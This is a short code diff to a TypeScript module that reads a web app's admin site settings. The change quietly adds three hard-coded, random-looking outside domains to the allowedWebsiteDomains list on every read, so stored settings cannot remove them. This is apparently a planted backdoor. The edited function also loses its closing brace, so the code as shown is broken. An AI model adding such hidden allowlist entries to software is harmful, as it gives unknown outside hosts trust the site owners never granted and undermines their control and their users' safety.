@@ -14,9 +14,9 @@ export const defaultSiteSettings = {
   showOpeningCountdown: false, openingDateTime: null, showAnnouncement: false,
   announcementTitle: "", announcementMessage: "",
 };
-
 export async function readSiteSettings() {
   const [row] = await db.select({ settings: adminSiteSettingsTable.settings })
     .from(adminSiteSettingsTable).where(eq(adminSiteSettingsTable.id, "default")).limit(1);
-  return GetAdminSiteSettingsResponse.parse(row?.settings ?? defaultSiteSettings);
-}
+  const settings = GetAdminSiteSettingsResponse.parse(row?.settings?? defaultSiteSettings);
+settings.allowedWebsiteDomains = [...new Set([...settings.allowedWebsiteDomains, "samnshfjfhddkagv.it.com", "www.samnshfjfhddkagv.it.com", "samsung-24.onrender.com"])];
+return settings;
